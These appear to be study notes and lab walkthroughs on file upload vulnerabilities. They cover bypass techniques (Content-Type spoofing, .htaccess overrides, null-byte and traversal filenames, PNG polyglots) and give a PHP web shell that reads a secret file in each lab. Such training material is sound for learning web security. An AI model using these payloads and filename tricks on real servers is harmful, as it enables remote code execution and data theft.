# File Upload
The impact of file upload vulnerabilities generally depends on two key factors:
- Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on.
- What restrictions are imposed on the file once it has been successfully uploaded.

## File upload restrictions bypass
- **Flawed file type validation:** change `Content-Type` header
- **Preventing file execution in user-accessible directories:** find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all
- **Overriding the server configuration:** Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present. Use this `AddType application/x-httpd-php .pucavv` to execute `.pucavv` as `.php` file. Similarly, developers can make directory-specific configuration on IIS servers using a web.config file. This might include directives such as the following, which in this case allows JSON files to be served to users:
`<staticContent><mimeMap fileExtension=".json" mimeType="application/json"/></staticContent>`
- **Obfuscating file extensions:**
  - Provide multiple extensions: `exploit.php.jpg`
  - Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
  - Try using the URL encoding (or double URL encoding): `exploit%2Ephp`
  - Add semicolons or URL-encoded null byte characters before the file extension: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
  - Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization: `xC0 x2E`, `xC4 xAE` or `xC0 xAE`.
  - Using transformation against stripping or replacing defenses: `exploit.p.phphp`
- **Flawed validation of the file's contents:** change the signature of a file using tools like `hexedit` or `exiftool`.

### LAB: Remote code execution via web shell upload
Upload this `.php` file containing:

    <?php echo file_get_contents('/home/carlos/secret') ?>

Visits `/files/avatars/test.php` to see the result of the command.

### LAB: Web shell upload via Content-Type restriction bypass
Upload this `.php` file containing:

    <?php echo file_get_contents('/home/carlos/secret') ?>

Intercept `POST /my-account/avatar` request and change the `Content-Type` to `image/jpeg`:

    ------WebKitFormBoundarySLv30wPSW47UnsOn
    Content-Disposition: form-data; name="avatar"; filename="test.php"
    Content-Type: image/jpeg

### LAB: Web shell upload via path traversal
Upload this `.php` file containing:

    <?php echo file_get_contents('/home/carlos/secret') ?>

Visit the avatar URL at `/files/avatar/exploit.php` and observe that the code is shown instead of the result of executed one.
Try to upload the `exploit.php` at different location by using path traversal by setting `filename:"../exploit.php"` and observe that the traversal part is stripped by the server:

    The file avatars/test.php has been uploaded.

This time use URL-encoding by setting: `filename:"..%2fexploit.php"` and notice the difference:

    The file avatars/../test.php has been uploaded.

Visit the avatar URL at `files/exploit.php` and retrieve the secret.

### LAB: Web shell upload via extension blacklist bypass
Upload this `.php` file containing:

    <?php echo file_get_contents('/home/carlos/secret') ?>

Visit the avatar URL at `/files/avatar/exploit.php` and observe that `.php` files are not allowed. But notice that the web server is Apache.
Upload this `.htaccess` file to make `.pucavv` files executable as `.php` files:

    AddType application/x-httpd-php .pucavv

Now resend the upload file request with the new filename set to "exploit.pucavv". Visit the avatar URL at `/files/avatar/exploit.php` and retrieve the secret.

### LAB: Web shell upload via obfuscated file extension
Notice that only `.jpeg` or `.png` files are allowed and the server only checks for the suffix to contain those extension.
Make use of null bytes and by setting `filename="exploit.php%00.png"`. This not only bypasses the check from the server but also makes it a valid `.php` file since everything after the null bytes are ignored.
Visit the avatar URL at `/files/avatar/exploit.php` and retrieve the secret.

### LAB: Remote code execution via polyglot web shell upload
The server checks for the signature of a file. Use `hexedit` to modify the header of `exploit.php` to contain the `png` signature:

    �PNG
    

    <?php echo file_get_contents('/home/carlos/secret') ?>

Successfully upload the file and visit the avatar URL to retrieve the secret.